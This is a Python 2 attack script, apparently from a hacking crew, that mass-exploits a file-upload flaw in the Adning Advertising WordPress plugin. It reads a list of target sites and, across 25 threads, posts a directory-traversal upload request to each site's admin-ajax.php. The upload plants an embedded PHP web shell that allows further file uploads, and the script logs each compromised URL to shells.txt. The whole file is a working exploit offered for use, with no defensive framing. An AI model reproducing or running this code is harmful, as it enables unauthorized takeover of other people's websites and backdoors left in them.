# -*- coding: utf-8 -*
#!/usr/bin/python
#####################################
import requests, re, urllib2, os, sys, codecs, random           
from multiprocessing.dummy import Pool                          
from time import time as timer  
import time
import json     
from zlib import compress, decompress
from platform import system 
from colorama import Fore                               
from colorama import Style               
from Queue import Queue               
from pprint import pprint                               
from colorama import init          
from base64 import b64encode, b64decode
from urlparse import urlparse
import warnings
import subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
reload(sys)  
sys.setdefaultencoding('utf8')
init(autoreset=True)
##########################################################################################
abang = '\033[31m'
ijo = '\033[32m'
kuning = '\033[33m'
birtu = '\033[34m'
ungu = '\033[35m'
biru = '\033[36m'
abu = '\033[37m'
CEND = '\033[0m' 
shell = """ <?php echo 'Logi_Internet'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>"""
filename = "JametKNTLS.php"
files = {'files[]':(filename, shell, 'text/html')}
#####################################
##########################################################################################
def logo():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]

    x = """
          \033[31m\   \033[31m/
   \033[34m----- (9\033[31m"-_-\033[34m)9  \033[37mVs  \033[34m6(\033[31mx_x"\033[34m6) -----
   '
   \033[32m>--------------------------------<
   - Jamet Crew - Wp Adning Advertising Mass Upload Shell -
   
   \033[41m\033[1;33m[Youtube : Logic Internet\033[0m
   \033[41m\033[1;33m[Blog : https://www.blog-gan.org\033[0m
   \033[41m\033[1;33m[ICQ : https://icq.im/Shin403\033[0m
"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)


logo()
start_raw = raw_input("\n\033[91mGive,Me List Dear\033[97m:~# \033[97m")
crownes = raw_input("\033[91mthread \033[97m\033[97m:~# \033[97m")
try:
    with open(start_raw, 'r') as f:
        ooo = f.read().splitlines()
except IOError:
	pass
	
try:
    ooo = list(dict.fromkeys(ooo))
except NameError:
    print '\033[31mOpen Your Eyes!'
    sys.exit()
count=0
with open(start_raw,'r')as f:
 for line in f:
    count+=1
print '\x1b[91m[\x1b[92m+\x1b[91m]\x1b[92mTOTAL WEBLIST=',count
##########################################################################################
users = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20150151 Firefox/28.0'}

def peler(url):
	try:
		data = {
		'allowed_file_types' : 'php,jpg,jpeg',
		'upload' : json.dumps({'dir' : '../'})
		}
		get_source = requests.post(url+'/wp-admin/admin-ajax.php?action=_ning_upload_image',headers=users, data=data ,files=files,timeout=15).text
		if '"success":true' in get_source:
			print (kuning+ 'Wp Adning Advertising: ' +biru+ url + ' ' + ijo+ 'Live' + CEND)
			open('shells.txt', 'a').write(url+'/'+filename+'\n')
		else:
			print (kuning+ 'Wp Adning Advertising: ' +biru+ url + ' ' + abang+ 'Buriq' +CEND)
	except:
		pass
	pass

##########################################################################################
def Main():
		try:
				
				start = timer()
				ThreadPool = Pool(25)
				Threads = ThreadPool.map(peler, ooo)
				print('TIME TAKE: ' + str(timer() - start) + ' S')
		except:
				pass


if __name__ == '__main__':
		Main()
